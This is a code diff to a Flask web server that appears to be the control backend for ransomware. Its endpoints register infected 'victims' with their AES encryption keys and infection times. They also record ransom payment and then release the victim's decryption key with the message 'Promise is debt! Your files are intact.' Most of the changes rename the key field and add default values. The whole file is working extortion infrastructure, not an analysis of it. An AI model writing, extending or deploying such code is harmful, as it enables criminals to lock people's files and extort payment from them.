@@ -24,13 +24,6 @@ CORS(app, resources={r'/*': {'origins': '*'}})
 #             return True
 #     return False
 
-
-# sanity check route
-# @app.route('/ping', methods=['GET'])
-# def ping_pong():
-#     return jsonify('pong!')
-
-
 @app.route('/victims', methods=['GET'])
 def all_victims():
     response_object = {'status': 'success'}
@@ -47,10 +40,10 @@ def add_victim():
             # 'id': uuid.uuid4().hex,
             'id': post_data.get('id'),
             'inf_time': time.ctime(),
-            'ransom': post_data.get('ransom'),
-            'AES_key': post_data.get('AES_key')
+            'ransom': post_data.get('ransom', False),
+            'aes_key': post_data.get('aes_key', None)
         })
-    V.new_victim(vid=post_data.get('id'), pkey=post_data.get('AES_key'))
+    V.new_victim(vid=post_data.get('id'), pkey=post_data.get('aes_key'))
     response_object['message'] = 'Victim added!'
     return jsonify(response_object)
 
@@ -67,11 +60,10 @@ def update_victim(victim_id):
         else:
             response_object['message'] = 'No such victim'
     else:
-
         if post_data.get('ransom'):
             k = V.paid(victim_id)
             response_object['message'] = 'Promise is debt! Your files are intact.'+k
-            response_object['AES_key'] = k
+            response_object['aes_key'] = k
     # else:
     #     response_object['message'] = 'Do not play tricks!'
     return jsonify(response_object)
@@ -87,7 +79,7 @@ def update_victim(victim_id):
 #         VICTIMS.append({
 #             # 'id': uuid.uuid4().hex,
 #             'id': post_data.get('victim_id'),
-#             'AES_key': post_data.get('AES_key'),
+#             'aes_key': post_data.get('aes_key'),
 #             'paid': post_data.get('paid')
 #         })
 #         response_object['message'] = 'Victim updated!'
